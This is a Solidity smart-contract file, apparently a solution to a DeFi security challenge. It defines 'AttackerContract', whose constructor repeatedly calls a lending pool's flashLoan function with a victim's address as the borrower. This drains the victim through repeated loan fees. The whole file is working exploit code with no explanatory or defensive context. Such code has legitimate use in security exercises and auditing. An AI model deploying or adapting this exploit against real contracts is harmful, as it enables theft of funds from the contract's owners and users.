// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoan {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerContract {
    address payable private pool;

    constructor(address payable poolAddress, address victim, uint256 iterations) {
        pool = poolAddress;
        exploit(victim, iterations);
    }

    function exploit(address _victim, uint256 iterations) public {
        for (uint256 i = 0; i < iterations; i++) {
            IFlashLoan(pool).flashLoan(_victim, 1 ether);
        }
    }
}
